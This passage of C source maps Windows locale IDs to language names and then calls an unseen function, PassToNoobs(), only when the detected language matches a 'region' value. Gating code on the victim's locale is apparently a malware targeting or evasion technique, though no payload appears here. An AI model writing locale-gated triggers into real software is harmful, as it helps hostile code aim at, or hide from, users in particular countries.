		case 0x042f: lang = "Macedonian"; break;
		case 0x043e: lang = "Malay (Malaysian)"; break;
		case 0x083e: lang = "Malay (Brunei Darussalam)"; break;
		case 0x044e: lang = "Marathi"; break;
		case 0x0450: lang = "Mongolian"; break;
		case 0x0414: lang = "Norwegian (Bokmal)"; break;
		case 0x0814: lang = "Norwegian (Nynorsk)"; break;
		case 0x0415: lang = "Polish"; break;
		case 0x0416: lang = "Portuguese (Brazil)"; break;
		case 0x0816: lang = "Portuguese (Portugal)"; break;
		case 0x0446: lang = "Punjabi"; break;
		case 0x0418: lang = "Romanian"; break;
		case 0x0419: lang = "Russian"; break;
		case 0x044f: lang = "Sanskrit"; break;
		case 0x0c1a: lang = "Serbian (Cyrillic)"; break;
		case 0x081a: lang = "Serbian (Latin)"; break;
		case 0x041b: lang = "Slovak"; break;
		case 0x0424: lang = "Slovenian"; break;
		case 0x040a: lang = "Spanish (Spain, Traditional Sort)"; break;
		case 0x080a: lang = "Spanish (Mexican)"; break;
		case 0x0c0a: lang = "Spanish (Spain, International Sort)"; break;
		case 0x100a: lang = "Spanish (Guatemala)"; break;
		case 0x140a: lang = "Spanish (Costa Rica)"; break;
		case 0x180a: lang = "Spanish (Panama)"; break;
		case 0x1c0a: lang = "Spanish (Dominican Republic)"; break;
		case 0x200a: lang = "Spanish (Venezuela)"; break;
		case 0x240a: lang = "Spanish (Colombia)"; break;
		case 0x280a: lang = "Spanish (Peru)"; break;
		case 0x2c0a: lang = "Spanish (Argentina)"; break;
		case 0x300a: lang = "Spanish (Ecuador)"; break;
		case 0x340a: lang = "Spanish (Chile)"; break;
		case 0x380a: lang = "Spanish (Uruguay)"; break;
		case 0x3c0a: lang = "Spanish (Paraguay)"; break;
		case 0x400a: lang = "Spanish (Bolivia)"; break;
		case 0x440a: lang = "Spanish (El Salvador)"; break;
		case 0x480a: lang = "Spanish (Honduras)"; break;
		case 0x4c0a: lang = "Spanish (Nicaragua)"; break;
		case 0x500a: lang = "Spanish (Puerto Rico)"; break;
		case 0x0430: lang = "Sutu"; break;
		case 0x0441: lang = "Swahili (Kenya)"; break;
		case 0x041d: lang = "Swedish"; break;
		case 0x081d: lang = "Swedish (Finland)"; break;
		case 0x045a: lang = "Syriac"; break;
		case 0x0449: lang = "Tamil"; break;
		case 0x0444: lang = "Tatar (Tatarstan)"; break;
		case 0x044a: lang = "Telugu"; break;
		case 0x041e: lang = "Thai"; break;
		case 0x041f: lang = "Turkish"; break;
		case 0x0422: lang = "Ukrainian"; break;
		case 0x0420: lang = "Urdu (Pakistan)"; break;
		case 0x0820: lang = "Urdu (India)"; break;
		case 0x0443: lang = "Uzbek (Latin)"; break;
		case 0x0843: lang = "Uzbek (Cyrillic)"; break;
		case 0x042a: lang = "Vietnamese"; break;
    }
		if(strcmp(lang,region))
		{
			
			return;

		}
		else
		{
			PassToNoobs();
		}
	return;
}

